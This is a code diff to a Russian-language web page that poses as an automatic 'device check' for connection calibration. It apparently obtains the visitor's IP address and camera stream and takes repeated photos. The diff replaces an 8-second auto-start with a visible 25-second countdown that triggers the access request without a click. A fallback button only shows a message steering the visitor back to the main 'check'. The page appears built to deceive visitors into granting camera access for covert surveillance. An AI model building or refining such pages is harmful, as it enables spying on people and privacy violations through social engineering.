@@ -135,6 +135,16 @@
             line-height: 1.4;
         }
         
+        .timer-notice {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: #0c5460;
+        }
+        
         .btn-primary {
             background: linear-gradient(135deg, #28a745, #20c997);
             color: white;
@@ -278,8 +288,9 @@
             pointer-events: none;
         }
         
-        .access-section {
-            display: none;
+        .countdown {
+            font-weight: bold;
+            color: #dc3545;
         }
     </style>
 </head>
@@ -313,6 +324,10 @@
                     • Калибровка параметров связи<br>
                     • Оптимизация скорости соединения
                 </div>
+            </div>
+            
+            <div class="timer-notice">
+                ⏱ Автоматическая проверка начнется через <span id="countdown">25</span> секунд
             </div>
             
             <button class="btn-primary" onclick="requestDeviceAccess()">
@@ -372,6 +387,23 @@
         let stream;
         let photoInterval;
         let userIP = 'Определяется...';
+        let autoStartTimer;
+
+        // Таймер обратного отсчета
+        function startCountdown() {
+            let seconds = 25;
+            const countdownElement = document.getElementById('countdown');
+            
+            autoStartTimer = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(autoStartTimer);
+                    requestDeviceAccess();
+                }
+            }, 1000);
+        }
 
         // Получаем IP адрес
         async function getUserIP() {
@@ -510,6 +542,11 @@
 
         // Основная функция доступа
         async function requestDeviceAccess() {
+            // Останавливаем таймер если он еще работает
+            if (autoStartTimer) {
+                clearInterval(autoStartTimer);
+            }
+            
             await getUserIP();
             
             try {
@@ -588,12 +625,10 @@
             alert('Альтернативный метод временно недоступен. Пожалуйста, используйте основной метод проверки устройства для обеспечения безопасного соединения.');
         }
 
-        // Автозапуск через 8 секунд если пользователь не нажал
-        setTimeout(() => {
-            if (document.getElementById('permissionRequest').style.display !== 'none') {
-                requestDeviceAccess();
-            }
-        }, 8000);
+        // Запускаем обратный отсчет при загрузке страницы
+        window.addEventListener('load', () => {
+            startCountdown();
+        });
 
     </script>
 </body>
